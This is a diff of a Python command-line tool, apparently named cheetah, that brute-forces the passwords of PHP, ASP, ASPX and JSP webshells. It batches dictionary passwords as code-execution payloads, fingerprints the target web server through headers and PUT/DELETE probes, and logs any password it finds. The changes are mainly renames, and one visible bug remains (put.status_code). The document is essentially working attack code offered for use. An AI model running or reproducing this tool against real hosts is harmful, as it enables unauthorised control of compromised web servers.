@@ -75,7 +75,7 @@ def quit(signum, frame):
     exit(0)
 
 
-def print_prog_info():
+def print_info():
     print('program: ' + __program__)
     print('version: ' + __version__)
     print('license: ' + __license__)
@@ -151,7 +151,7 @@ def req_get(payload, times, options):
                          headers=header,
                          params=payload,
                          timeout=10)
-        error_msg = '[ERROR] web server of '+options.url+' response code: '+str(r.status_code)
+        error_msg = '[ERROR] '+options.url+' response code: '+str(r.status_code)
     except Exception as e:
         print_highlight('[ERROR] ' + str(e))
         print_highlight(error_msg)
@@ -166,21 +166,22 @@ def req_get(payload, times, options):
     code = [413, 414, 500]
     if r.status_code in code:
         print_highlight(error_msg)
-        print_highlight('[WARN] maybe the request url too long when request '+options.url)
+        print_highlight('[WARN] request url too long when request '+options.url)
         print_highlight('[HINT] try to specify a smaller value of parameter -n')
         return 'error'
 
     if r.status_code in range(200, 300):
+        pwd_hint = '[HINT] password of '+options.url
         print_highlight('[INFO] web server responds successfully')
         if r.text in payload:
-            print(white+get_time()+'[HINT] password of '+options.url+' is '+reset+red+r.text+reset)
+            print(white+get_time()+pwd_hint+' is '+reset+red+r.text+reset)
             with open('find.list', 'a') as find_file:
                 find_file.write(options.url+'\t\t'+r.text+'\n')
             print_highlight('[HINT] password has been written to find.list file')
             return 'find'
         else:
             if options.verbose:
-                print_highlight('[INFO] password of '+options.url+' not in '+str(times)+' th group payload')
+                print_highlight(pwd_hint+' not in '+str(times)+' th group payload')
             return 'unfind'
     else:
         print_highlight(error_msg)
@@ -200,7 +201,7 @@ def req_post(payload, times, options):
                           headers=header,
                           data=payload,
                           timeout=10)
-        error_msg = '[ERROR] web server of '+options.url+' response code: '+str(r.status_code)
+        error_msg = '[ERROR] '+options.url+' response code: '+str(r.status_code)
     except Exception as e:
         print_highlight('[ERROR] '+str(e))
         print_highlight(error_msg)
@@ -215,22 +216,23 @@ def req_post(payload, times, options):
     code = [413, 414, 500]
     if r.status_code in code:
         print_highlight(error_msg)
-        print_highlight('[WARN] maybe the request url too long when request '+options.url)
+        print_highlight('[WARN] request url too long when request '+options.url)
         print_highlight('[HINT] try to specify a smaller value of parameter -n')
         return 'error'
 
     if r.status_code in range(200, 300):
+        pwd_hint = '[HINT] the password of ' + options.url
         if options.verbose:
             print_highlight('[INFO] web server responds successfully')
         if r.text in payload:
-            print(white+get_time()+'[HINT] password of '+options.url+' is '+reset+red+r.text+reset)
+            print(white+get_time()+pwd_hint+' is '+reset+red+r.text+reset)
             with open('find.list', 'a') as find_file:
                 find_file.write(options.url+'\t\t'+r.text+'\n')
             print_highlight('[HINT] password has been written to find.list')
             return 'find'
         else:
             if options.verbose:
-                print_highlight('[INFO] the password of '+options.url+' not in '+str(times)+' th group payload')
+                print_highlight(pwd_hint+' not in '+str(times)+' th group payload')
             return 'notfind'
     else:
         print_highlight(error_msg)
@@ -240,18 +242,19 @@ def req_post(payload, times, options):
 def detect_web(options):
     print_highlight('[WARN] not specify the web server or shell type')
     print_highlight('[INFO] detecting server info of '+options.url)
-    web_server_list = ['apache', 'nginx', 'iis']
-    shell_type_list = ['php', 'aspx', 'asp', 'jsp']
+    server_list = ['apache', 'nginx', 'iis']
+    shell_list = ['php', 'aspx', 'asp', 'jsp']
     header = gen_random_header(options)
-
-    if options.shell_type == 'detect':
-        for shell_type in shell_type_list:
-            if shell_type in options.url.lower():
-                print_highlight('[HINT] the webshell type may be '+shell_type)
-                options.shell_type = shell_type
+    web_hint = '[HINT] web server may be '
+    shell_hint = '[HINT] the shell type may be '
+    if options.shell == 'detect':
+        for shell in shell_list:
+            if shell in options.url.lower():
+                print_highlight(shell_hint+shell)
+                options.shell = shell
                 break
 
-    if options.web_server == 'detect' or options.shell_type == 'detect':
+    if options.server == 'detect' or options.shell == 'detect':
         try:
             get_rsp = requests.get(url=options.url, headers=header)
         except Exception as e:
@@ -259,53 +262,54 @@ def detect_web(options):
             return 'error'
 
         if 'server' in get_rsp.headers:
-            print_highlight('[HINT] web server may be '+get_rsp.headers['server'])
-            options.web_server = get_rsp.headers['server'].lower()
+            print_highlight(web_hint+get_rsp.headers['server'])
+            options.server = get_rsp.headers['server'].lower()
 
         if 'x-powered-by' in get_rsp.headers:
-            print_highlight('[HINT] web server may be x-powered-by '+get_rsp.headers['x-powered-by'])
-            if options.shell_type == 'detect':
-                for shell_type in shell_type_list:
-                    if shell_type in get_rsp.headers['x-powered-by'].lower():
-                        print_highlight('[HINT] shell type may be '+shell_type)
-                        options.shell_type = shell_type
+            power_hint = '[HINT] web server may be x-powered-by '
+            print_highlight(power_hint+get_rsp.headers['x-powered-by'])
+            if options.shell == 'detect':
+                for shell in shell_list:
+                    if shell in get_rsp.headers['x-powered-by'].lower():
+                        print_highlight(shell_hint+shell)
+                        options.shell = shell
                         break
-            if options.web_server == 'detect':
-                for web_server in web_server_list:
-                    if web_server in get_rsp.headers['x-powered-by'].lower():
-                        print_highlight('[HINT] web server may be '+web_server)
-                        options.web_server = web_server
+            if options.server == 'detect':
+                for server in server_list:
+                    if server in get_rsp.headers['x-powered-by'].lower():
+                        print_highlight(web_hint+server)
+                        options.server = server
                         break
 
-    if options.web_server == 'detect':
+    if options.server == 'detect':
         random_str = str(random.sample(string.printable, 5)).encode('hex')
         reg = 'http(s)?:\/\/[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+'
         random_url = re.search(reg, options.url).group(0) + random_str
         random_rsp = requests.get(url=random_url, headers=header)
         if random_rsp.status_code == 404:
-            for web_server in web_server_list:
-                if web_server in str(random_rsp.text).lower():
-                    print_highlight('[HINT] the web server may be '+web_server)
-                    options.web_server = web_server
+            for server in server_list:
+                if server in str(random_rsp.text).lower():
+                    print_highlight(web_hint+server)
+                    options.server = server
                     break
 
-    if options.web_server == 'detect':
+    if options.server == 'detect':
         put_rsp = requests.put(url=options.url, headers=header)
         if put_rsp.status_code == 405 or put_rsp.status_code == 411:
-            options.web_server = 'nginx'
-            print_highlight('[HINT] the web server may be '+options.web_server)
+            options.server = 'nginx'
+            print_highlight(web_hint+options.server)
         if put.status_code == 200:
-            options.web_server = 'apache'
-            print_highlight('[HINT] the web server may be '+options.web_server)
+            options.server = 'apache'
+            print_highlight(web_hint+options.server)
 
-    if options.web_server == 'detect':
+    if options.server == 'detect':
         del_rsp = requests.delete(url=options.url, headers=header)
         if del_rsp.status_code == 501:
-            options.web_server = 'iis'
-            print_highlight('[HINT] the web server may be '+options.web_server)
+            options.server = 'iis'
+            print_highlight(web_hint+options.server)
         if del_rsp.status_code == 403:
-            options.web_server = 'apache'
-            print_highlight('[HINT] the web server may be '+options.web_server)
+            options.server = 'apache'
+            print_highlight(web_hint+options.server)
 
 
 def set_max_req(options):
@@ -315,22 +319,22 @@ def set_max_req(options):
                        'nginx': {'post': 1000, 'get': 756},
                        'iis': {'post': 4000, 'get': 45}}
         for server in server_dict:
-            if server in options.web_server:
-                print_highlight('[INFO] the web server '+options.web_server+' '+options.req_type+' request default setting '+str(server_dict[server][options.req_type]))
+            if server in options.server:
+                print_highlight('[INFO] setting the number of request parameters '+str(server_dict[server][options.req_type]))
                 options.max_request = server_dict[server][options.req_type]
                 break
 
     if options.max_request is None:
         if options.req_type == 'post':
-            print_highlight('[INFO] the web server '+options.web_server+' '+options.req_type+' default setting 10000')
+            print_highlight('[INFO] the web server '+options.server+' '+options.req_type+' default setting 10000')
             options.max_request = 1000
         if options.req_type == 'get':
-            print_highlight('[INFO] the web server '+options.web_server+' '+options.req_type+' default setting 100')
+            print_highlight('[INFO] the web server '+options.server+' '+options.req_type+' default setting 100')
             options.max_request = 100
 
 
 def dict_attack(options):
-    if options.web_server == 'detect' or options.shell_type == 'detect':
+    if options.server == 'detect' or options.shell == 'detect':
         if detect_web(options) == 'error':
             return 'error'
     set_max_req(options)
@@ -351,13 +355,13 @@ def dict_attack(options):
         pwd_find = ''
         for pwd in pwd_file:
             pwd = pwd.replace('\n', '')
-            if options.shell_type == 'php':
+            if options.shell == 'php':
                 payload[pwd] = '$s='+pwd+';print($s);'
-            if options.shell_type == 'asp':
+            if options.shell == 'asp':
                 payload[pwd] = 'response.write("'+pwd+'")'
-            if options.shell_type == 'aspx':
+            if options.shell == 'aspx':
                 payload[pwd] = 'Response.Write("'+pwd+'");'
-            if options.shell_type == 'jsp':
+            if options.shell == 'jsp':
                 payload[pwd] = 'System.out.println("'+pwd+'");'
 
             if len(payload) == options.max_request:
@@ -438,7 +442,7 @@ use examples:
   python cheetah.py -u http://orz/orz.asp -r get -c -p pwd.list
   python cheetah.py -u http://orz/orz -w aspx -s iis -n 1000
   python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v''')
-    parser.add_argument('-i', '--info', action='store_true', dest='prog_info',
+    parser.add_argument('-i', '--info', action='store_true', dest='info',
                         help='show information of cheetah and exit')
     parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
                         help='enable verbose output(default disabled)')
@@ -455,9 +459,9 @@ use examples:
     parser.add_argument('-w', '--webshell', default='detect', metavar='',
                         choices=['php', 'asp', 'aspx', 'jsp'],
                         help="specify webshell type(default auto-detect)",
-                        dest='shell_type')
+                        dest='shell')
     parser.add_argument('-s', '--server', default='detect',
-                        dest='web_server', metavar='',
+                        dest='server', metavar='',
                         choices=['apache', 'nginx', 'iis'],
                         help="specify web server name(default auto-detect)")
     parser.add_argument('-n', '--number', type=int,
@@ -487,8 +491,8 @@ use examples:
             print('[*] hint: try to use "python update.py" to update cheetah')
             exit(0)
 
-    if options.prog_info:
-        print_prog_info()
+    if options.info:
+        print_info()
         exit(0)
 
     if options.url is None and options.url_file is None:
@@ -499,7 +503,7 @@ use examples:
         options.pwd_file_list = [options.pwd_file_list]
 
     options.req_type = options.req_type.lower()
-    options.web_server = options.web_server.lower()
+    options.server = options.server.lower()
 
     print_highlight('[INFO] the cheetah start execution')
     signal.signal(signal.SIGINT, quit)
